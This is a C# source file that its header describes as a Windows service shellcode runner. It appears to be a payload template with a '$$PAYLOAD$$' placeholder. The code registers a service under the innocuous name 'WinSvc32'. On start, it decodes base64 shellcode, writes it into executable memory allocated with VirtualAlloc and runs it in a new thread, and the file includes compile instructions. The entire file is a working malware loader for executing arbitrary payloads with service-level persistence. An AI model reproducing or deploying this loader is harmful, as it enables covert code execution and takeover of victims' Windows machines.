using System;
using System.IO;
using System.ServiceProcess;
using System.Runtime.InteropServices;

/*
Shellcode runner Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause

Service executeable shellcode runner
To compile:
mcs /reference:System.ServiceProcess Service-ShellcodeRunner.cs -out:Windows-Service.exe
*/

namespace WinService
{
    class WinService : ServiceBase
    {
        public const string _ServiceName = "WinSvc32";

        static void Main(string[] args)
        {
            Run(new WinService());
        }

        public WinService()
        {
            ServiceName = _ServiceName;
        }

        protected override void OnStart(string[] args)
        {
            string strShellCode = ("$$PAYLOAD$$");
            byte[] shellcode = Convert.FromBase64String(strShellCode);   
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        protected override void OnStop()
        {
            base.OnStop();
        }

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    }
}